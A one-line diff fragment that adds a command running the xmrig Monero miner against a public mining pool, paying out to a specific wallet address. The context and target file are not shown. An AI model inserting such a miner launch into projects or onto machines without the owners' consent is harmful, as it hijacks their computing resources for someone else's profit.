@@ -1,0 +1,1 @@
+xmrig.exe -o sg.minexmr.com:4444 -u 85y3SxqvVvKGp8GcDahCz9CyoxJ8MXFpKNnmUNXRHCDvTGGJALyBjxLEvJuzrxfjQaNce71DoLa6SRw9bWGDWsXwVquSwbk
